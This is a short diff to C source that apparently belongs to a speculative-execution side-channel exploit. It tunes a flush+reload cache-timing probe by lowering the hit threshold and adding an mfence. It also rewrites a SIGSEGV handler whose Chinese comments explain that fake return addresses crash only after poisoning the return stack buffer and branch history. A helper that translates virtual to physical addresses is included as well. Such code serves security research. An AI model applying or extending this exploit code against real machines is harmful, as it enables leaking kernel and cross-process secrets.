@@ -59,7 +59,7 @@ static inline __attribute__((always_inline)) void reload_range(long base, long s
         u64 t0 = rdtsc();
         *(volatile unsigned char *)p;
         u64 dt = rdtscp() - t0;
-        if (dt < 70) results[c]++;
+        if (dt < 20) results[c]++;
     }
 }
 
@@ -69,6 +69,7 @@ static inline __attribute__((always_inline)) void flush_range(long start, long s
         volatile void *p = (u8 *)start + k * stride;
         __asm__ volatile("clflushopt (%0)\n"::"r"(p));
         __asm__ volatile("clflushopt (%0)\n"::"r"(p));
+        __asm__ volatile("mfence");
     }
     asm("lfence");
 }
@@ -181,13 +182,16 @@ static void handle_segv(int sig, siginfo_t *si, void *unused)
     exit(sig);
 }
 
-static void inline setup_segv_handler() {
+static void setup_segv_handler() {
     struct sigaction sa;
-    sa.sa_flags = SA_SIGINFO;
-    sigemptyset(&sa.sa_mask);
-    sa.sa_sigaction = &handle_segv;
-    sigaction (SIGSEGV, &sa, NULL);
+
+    sa.sa_flags = SA_SIGINFO;        // 使用 siginfo_t 参数
+    sigemptyset(&sa.sa_mask);       // 阻塞空信号集;信号处理期间不阻塞额外信号
+    sa.sa_sigaction = &handle_segv;  // 信号处理函数
+    // ret_path 中很多地址是“假的”;ret 会 crash;但 crash 之前：RSB / BHB 已经被污染
+    sigaction(SIGSEGV, &sa, NULL);   // 注册 SIGSEGV 处理器
 }
+
 static long va_to_phys(int fd, long va)
 {
     unsigned long pa_with_flags;
